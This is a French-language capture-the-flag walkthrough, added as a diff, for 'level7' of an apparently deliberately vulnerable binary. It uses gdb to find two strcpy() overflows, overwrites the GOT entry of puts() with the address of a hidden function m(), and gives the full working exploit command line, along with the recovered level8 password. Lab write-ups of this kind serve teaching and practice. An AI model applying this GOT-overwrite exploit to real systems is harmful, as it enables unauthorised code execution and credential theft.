@@ -1,0 +1,70 @@
+LEVEL 7
+-------
+
+1.	gdb level7
+
+2.	disas main
+	Tout d'abord on essaie d'apercevoir si quelque chose nous permet
+	d'obtenir directement le .pass du level8.
+
+	Il y a sur la ligne +178 la fonction fopen() qui a en paramètre
+	0x80486eb ---> x/s 0x80486eb = "/home/user/level8/.pass"
+
+	Le fichier qui contient le .pass a été ouvert, ensuite un fgets()
+	est effectué pour écrire le contenu du fichier dans 0x8049960
+	qui est une variable globale. (info variables --> 0x08049960  c)
+
+	Pour terminer on sait qu'une fonction m() existe graĉe à info functions
+	et ensuite disas m qui affiche cette variable, mais elle n'est jamais
+	appelée. On suppose qu'il va falloir l'appeler.
+
+2.	Strcpy est appelée 2 fois, on sait que cette fonction peut être sujet
+	à un overflow. On fait différents tests.
+	Tout d'abord on lance le programme avec un argument, ./level7 AAAAAAAAA.
+	Le programme segfault.
+	On le lance avec 2 arguments, ./level7 AAAAAAAA BBBBBBB
+	le programme affiche "~~".
+	On place des breakpoints après chaque appel de strcpy() pour voir où est
+	ce que le programme va segfault si une des chaines est trop longue:
+	b *0x080485a5 --> adresse après le premier strcpy()
+	b *0x080485c2 --> adresse après le deuxième strcpy()
+	run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBB
+	Le programme ne sefault par pour le premier.
+	continue
+	Le programme segfault pour le deuxième.
+	On analyse les registres: i r
+	On voit que eax a été rempli (0x41414141) par l'overflow du premier strcpy().
+	Si eax est rempli cela veut dire que la destination de la fonction strcpy
+	peut être modifié. Prototype fonction strcpy() ---> strcpy(dst, src).
+	Donc on va faire en sorte de modifier la destination par src qui va être 
+	notre 2ème argument passé au programme.
+
+3.	On sait que la fonction puts() est exécutée après l'écriture du flag dans
+	la variable c. On va modifier l'adresse dans le GOT (Global Offset Table)
+	de puts() par l'adresse de m().
+
+	info functions puts
+	0x08048400  puts@plt
+	x/i 0x08048400
+	0x8048400 <puts@plt>:	jmp    *0x8049928
+
+	Adresse dans le GOT de puts() = 0x8049928.
+	Cette adresse nous allons la mettre à la fin du premier argv, pour qu'elle
+	se retrouve dans la dst du deuxième strcpy().
+
+	info functions
+	0x080484f4  m
+	Adresse de m(), à mettre en deuxième argv.
+
+4.	Après avoir trouvé l'offset en effectuant quelques tests, on trouve la
+	valeur 20.
+	Donc il va falloir afficher 20 caractères avant la première adresse.
+
+	./level7 $(python -c 'print "A"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
+5.	On lance la commande d'au dessus.
+	./level7 $(python -c 'print "A"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+	5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+6.	su level8
+	5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
